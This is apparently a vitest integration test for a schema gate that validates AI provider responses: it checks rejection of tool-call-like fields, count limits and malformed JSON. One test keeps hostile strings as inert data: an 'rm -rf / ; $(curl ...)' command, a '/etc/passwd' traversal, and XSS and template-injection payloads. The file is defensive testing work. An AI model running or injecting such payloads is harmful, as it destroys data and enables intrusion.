// Task 3.8: the AI response gate with the real schemas of this package, and with the real Mock_Provider through a real audit.
// (The whole-response property test is task 3.9.) The gate lives in `packages/ai-client` and takes the validator as a port; this package supplies it.
import { describe, expect, it } from "vitest";
import {
  DEFAULT_MOCK_FIXTURES, DEFAULT_RESPONSE_LIMITS, auditPayload, createProvider, gateProviderResult, gateResponse, resolveResponseLimits, sha256Hex, toInertText,
} from "../../ai-client/src/index.js";
import type { AuditedRequest, RequestKind, ResponseLimits, SchemaValidatorPort } from "../../ai-client/src/index.js";
import { build } from "../../ai-client/test/helpers/propertyWorld.js";
import { createSchemaValidator } from "../src/schema/index.js";

const validator = createSchemaValidator() as unknown as SchemaValidatorPort;
const L = DEFAULT_RESPONSE_LIMITS;
const enc = (s: string): Uint8Array => new TextEncoder().encode(s);
const fixture = (kind: RequestKind): Uint8Array => (DEFAULT_MOCK_FIXTURES.find((f) => f.requestKind === kind) as { response: Uint8Array }).response;
const json = (b: Uint8Array): any => JSON.parse(new TextDecoder().decode(b));
const gate = (kind: RequestKind, o: unknown, limits: ResponseLimits = L) => gateResponse(kind, enc(JSON.stringify(o)), limits, validator);
const rejection = (r: ReturnType<typeof gateResponse>) => {
  if (r.ok) throw new Error("expected a rejection");
  return r;
};

const claim = (n: number, over: Record<string, unknown> = {}) => ({ ...json(fixture("hypothesis_generation")).claims[0], localKey: `claim_${n}`, ...over });
const hypothesis = (claims: unknown[]) => ({ claims });
const experiment = (n: number, over: Record<string, unknown> = {}) => ({ ...json(fixture("experiment_generation")).experiments[0], localKey: `exp_${n}`, ...over });

describe("the Mock_Provider fixtures pass the gate with the real schemas", () => {
  it.each(["hypothesis_generation", "hypothesis_revision", "experiment_generation"] as const)("%s is accepted, with the SHA-256 of the exact bytes", (kind) => {
    const r = gateResponse(kind, fixture(kind), L, validator);
    expect(r.ok).toBe(true);
    expect(r.sha256).toBe(sha256Hex(fixture(kind)));
    if (r.ok && r.kind === "experiment_generation") expect([r.experiments.length, r.rejectedExperiments.length]).toEqual([1, 0]);
  });
});

describe("through the Provider Wrapper and a real audit", () => {
  const spec = { kind: "hypothesis_generation" as const, sources: [{ path: "legacy/src/utils.php", text: "<?php\n// fictional\n" }], stored: [{ type: "hypothesis_revision" as const, content: { note: "fictional" } }] };
  const newRequest = (kind: RequestKind): AuditedRequest => {
    const b = build({ ...spec, kind });
    const r = auditPayload(b.bytes(), kind, b.cfg, b.ctx).request;
    if (r === undefined) throw new Error("the fixture payload must pass");
    return r;
  };
  const live = () => ({ timeoutMs: 1000, signal: new AbortController().signal });

  it("an audited request is served and the response passes the gate, for each request kind", async () => {
    const provider = createProvider({ provider: "mock" });
    for (const kind of ["hypothesis_generation", "hypothesis_revision", "experiment_generation"] as const) {
      const out = gateProviderResult(kind, await provider.complete(newRequest(kind), live()), L, validator);
      expect(out.kind, kind).toBe("accepted");
    }
  });

  it("an audit violation is not mixed up with a rejected response: it stops the Run and is never retried", async () => {
    const provider = createProvider({ provider: "mock" });
    const req = newRequest("hypothesis_generation");
    await provider.complete(req, live());
    const out = gateProviderResult("hypothesis_generation", await provider.complete(req, live()), L, validator); // used twice
    expect(out).toMatchObject({ kind: "audit_violation", retryable: false, stopRun: true });
    const forged = { kind: "hypothesis_generation", bytes: enc("x"), sha256: sha256Hex(enc("x")) } as unknown as AuditedRequest;
    expect(gateProviderResult("hypothesis_generation", await provider.complete(forged, live()), L, validator).kind).toBe("audit_violation");
  });

  it("an unmatched request is a failed call of the provider, not a response to be inspected", async () => {
    const empty = createProvider({ provider: "mock", mockFixtureSet: "default-widget-v1" });
    void empty;
    const out = gateProviderResult("hypothesis_generation", { ok: false, error: { reason: "unmatched_request", detail: "d" } }, L, validator);
    expect(out).toMatchObject({ kind: "failed_call", source: "provider", retryable: true });
  });
});

describe("hypothesis responses (R4.2, R4.3, R4.8, R17.6)", () => {
  it("rejects a field the schema does not define, whole, with the tool-call flag when the name looks like one", () => {
    const base = json(fixture("hypothesis_generation"));
    const a = rejection(gate("hypothesis_generation", { ...base, notes: "x" }));
    expect([a.reason, a.toolCallLike, a.issues]).toEqual(["undefined_field", false, [{ code: "undefined_field", path: "/notes" }]]);
    for (const name of ["tool_calls", "function_call", "action", "command", "shell"]) {
      const r = rejection(gate("hypothesis_generation", { ...base, [name]: [{ name: "run_command", arguments: "ls" }] }));
      expect([r.reason, r.toolCallLike], name).toEqual(["undefined_field", true]);
    }
  });

  it("rejects an undefined field inside a Claim and in a nested expression; authority-like names at the top level of a Claim are removed instead (task 3.10), elsewhere they are undefined fields", () => {
    const base = json(fixture("hypothesis_generation"));
    const inClaim = rejection(gate("hypothesis_generation", hypothesis([{ ...base.claims[0], exec: "ls" }])));
    expect([inClaim.reason, inClaim.toolCallLike, inClaim.issues[0]?.path]).toEqual(["undefined_field", true, "/claims/0/exec"]);
    const inExpr = structuredClone(base);
    inExpr.claims[0].condition.expression.extra = 1;
    expect(rejection(gate("hypothesis_generation", inExpr)).reason).toBe("undefined_field");
    for (const name of ["origin", "evidence", "evidence_status", "approval", "approved"]) {
      const removed = gate("hypothesis_generation", hypothesis([{ ...base.claims[0], [name]: "x" }]));
      expect(removed.ok, name).toBe(true); // task 3.10: removed at the top level of a Claim, the rest is validated
      const nested = structuredClone(base);
      nested.claims[0].condition[name] = "x";
      expect(rejection(gate("hypothesis_generation", nested)).reason, name).toBe("undefined_field"); // anywhere else it stays an undefined field
      expect(rejection(gate("hypothesis_generation", { ...base, [name]: "x" })).reason, name).toBe("undefined_field");
    }
  });

  it("rejects a missing field, a wrong type and a wrong value as a schema violation", () => {
    const base = json(fixture("hypothesis_generation"));
    const noConfidence = { ...base.claims[0] };
    delete noConfidence.confidence;
    expect(rejection(gate("hypothesis_generation", hypothesis([noConfidence]))).reason).toBe("schema_violation");
    expect(rejection(gate("hypothesis_generation", hypothesis([{ ...base.claims[0], confidence: "certain" }]))).reason).toBe("schema_violation");
    expect(rejection(gate("hypothesis_generation", hypothesis([{ ...base.claims[0], openQuestions: "none" }]))).reason).toBe("schema_violation");
    expect(rejection(gate("hypothesis_generation", hypothesis([]))).reason).toBe("schema_violation"); // at least one Claim
    expect(rejection(gate("hypothesis_generation", [])).reason).toBe("schema_violation");
  });

  it("enforces the configured count limits with the limit named, and counts before the schema", () => {
    const many = (n: number) => hypothesis(Array.from({ length: n }, (_x, i) => claim(i)));
    const r = rejection(gate("hypothesis_generation", many(51)));
    expect([r.reason, r.limit]).toEqual(["count_exceeded", { name: "maxClaims", limit: 50, observed: 51 }]);
    expect(gate("hypothesis_generation", many(50)).ok).toBe(true);
    const tight = resolveResponseLimits({ maxClaims: 2, maxCitationsPerClaim: 1 });
    if (!tight.ok) throw new Error("limits");
    expect(rejection(gate("hypothesis_generation", many(3), tight.value)).limit).toEqual({ name: "maxClaims", limit: 2, observed: 3 });
    const cited = { ...claim(1), citations: Array.from({ length: 6 }, () => ({ file: "legacy/src/utils.php", startLine: 1, endLine: 1, quote: "q" })) };
    expect(rejection(gate("hypothesis_generation", hypothesis([cited]))).limit).toEqual({ name: "maxCitationsPerClaim", limit: 5, observed: 6 });
  });

  it("a configured limit above a fixed bound of the schema has no effect beyond that bound (a design point for M4: the schema caps are constants)", () => {
    const wide = resolveResponseLimits({ maxClaims: 100 });
    if (!wide.ok) throw new Error("limits");
    const r = rejection(gate("hypothesis_generation", hypothesis(Array.from({ length: 51 }, (_x, i) => claim(i))), wide.value));
    expect(r.reason).toBe("schema_violation"); // the gate's count check passed, the schema's maxItems 50 did not
  });

  it("keeps text that looks dangerous as inert data, and shows it escaped", () => {
    const base = json(fixture("hypothesis_generation"));
    const bad = ["rm -rf / ; $(curl http://example.invalid)", "../../etc/passwd", "<script>alert(1)</script>", "javascript:alert(1)", "{{7*7}} ${process.env.HOME}"];
    const claims = bad.map((t, i) => ({ ...base.claims[0], localKey: `c${i}`, condition: { ...base.claims[0].condition, description: t }, openQuestions: [t] }));
    const r = gate("hypothesis_generation", hypothesis(claims));
    expect(r.ok).toBe(true);
    if (r.ok && r.kind !== "experiment_generation") {
      const shown = toInertText(JSON.stringify(r.proposal));
      expect(shown.includes("<script>")).toBe(false);
      expect(shown).toContain("&lt;script&gt;");
    }
  });
});

describe("experiment responses (R7.2, R7.4, R7.7, R7.8, R17.2)", () => {
  it("keeps the valid Experiments and drops one that fails the schema or names the reset operation (R7.4, R7.5)", () => {
    const good = experiment(1);
    const noPrediction = { ...experiment(2) };
    delete noPrediction.prediction;
    const reset = experiment(3, { requests: [{ method: "POST", path: "/reset" }] });
    const testPath = experiment(4, { requests: [{ method: "POST", path: "/test/orders/1/ship" }] });
    const r = gate("experiment_generation", { experiments: [good, noPrediction, reset, testPath, experiment(5)] });
    expect(r.ok).toBe(true);
    if (r.ok && r.kind === "experiment_generation") {
      expect(r.experiments).toHaveLength(2);
      expect(r.rejectedExperiments.map((x) => x.index)).toEqual([1, 2, 3]);
    }
  });

  it("an undefined field in any Experiment rejects the whole response, with the position, and a tool-call-like name is flagged", () => {
    const r = rejection(gate("experiment_generation", { experiments: [experiment(1), experiment(2, { tool_call: { name: "x" } })] }));
    expect([r.reason, r.toolCallLike, r.issues[0]?.path]).toEqual(["undefined_field", true, "/experiments/1/tool_call"]);
    expect(rejection(gate("experiment_generation", { experiments: [], command: "ls" })).toolCallLike).toBe(true);
  });

  it("when every Experiment is rejected on its own, the response is still valid and is not a failed provider call (experiment_invalid, task 3.10 decision)", () => {
    const bad = (n: number) => { const e = experiment(n); delete e.prediction; return e; };
    const out = gateProviderResult("experiment_generation", { ok: true, value: enc(JSON.stringify({ experiments: [bad(1), bad(2), bad(3)] })) }, L, validator);
    expect(out.kind).toBe("accepted");
    if (out.kind === "accepted" && out.result.kind === "experiment_generation") {
      expect(out.result.experiments).toHaveLength(0);
      expect(out.result.rejectedExperiments.map((x) => x.index)).toEqual([0, 1, 2]);
    }
  });

  it("zero accepted Experiments is a valid response for the gate (the orchestrator applies R7.8 and R11.14)", () => {
    const r = gate("experiment_generation", { experiments: [] });
    expect(r.ok && r.kind === "experiment_generation" && r.experiments.length).toBe(0);
  });

  it("enforces the count limits: Experiments, requests per Experiment, and request body bytes (8,192 allowed, 8,193 refused)", () => {
    const r1 = rejection(gate("experiment_generation", { experiments: Array.from({ length: 11 }, (_x, i) => experiment(i)) }));
    expect(r1.limit).toEqual({ name: "maxExperiments", limit: 10, observed: 11 });
    const reqs = (n: number) => Array.from({ length: n }, () => ({ method: "GET", path: "/orders" }));
    expect(rejection(gate("experiment_generation", { experiments: [experiment(1, { requests: reqs(11) })] })).limit).toEqual({ name: "maxRequestsPerExperiment", limit: 10, observed: 11 });
    const withBody = (n: number) => ({ experiments: [experiment(1, { requests: [{ method: "POST", path: "/orders", body: { d: "x".repeat(n - 8) } }] })] });
    expect(gate("experiment_generation", withBody(8192)).ok).toBe(true);
    expect(rejection(gate("experiment_generation", withBody(8193))).limit).toEqual({ name: "maxRequestBodyBytes", limit: 8192, observed: 8193 });
  });
});

describe("hostile responses are rejected whole or kept as data, with no effect (R17.10)", () => {
  it("rejects an oversized, malformed, duplicate-key and deeply nested response", () => {
    const fx = new TextDecoder().decode(fixture("hypothesis_generation"));
    const cases: [string, Uint8Array][] = [
      ["size_exceeded", enc(fx + " ".repeat(DEFAULT_RESPONSE_LIMITS.maxResponseBytes))],
      ["invalid_json", enc(fx.slice(0, -5))],
      ["duplicate_key", enc(fx.replace('"claims"', '"claims":[],"claims"'))],
      ["depth_exceeded", enc(`{"claims":${"[".repeat(40)}${"]".repeat(40)}}`)],
      ["invalid_json", enc("```json\n" + fx + "\n```")],
    ];
    for (const [reason, bytes] of cases) expect(rejection(gateResponse("hypothesis_generation", bytes, L, validator)).reason, reason).toBe(reason);
  });

  it("no rejection holds any text of the response", () => {
    const marker = "MARKER-INTEGRATION-9914";
    const base = json(fixture("hypothesis_generation"));
    const r = rejection(gate("hypothesis_generation", { ...base, [`k-${marker}`]: marker, claims: [{ ...base.claims[0], [`z${marker}`]: marker }] }));
    expect(JSON.stringify(r).includes(marker)).toBe(false);
    const outcome = gateProviderResult("hypothesis_generation", { ok: true, value: enc(JSON.stringify({ x: marker })) }, L, validator);
    expect(JSON.stringify(outcome).includes(marker)).toBe(false);
    expect(outcome.kind).toBe("failed_call");
  });
});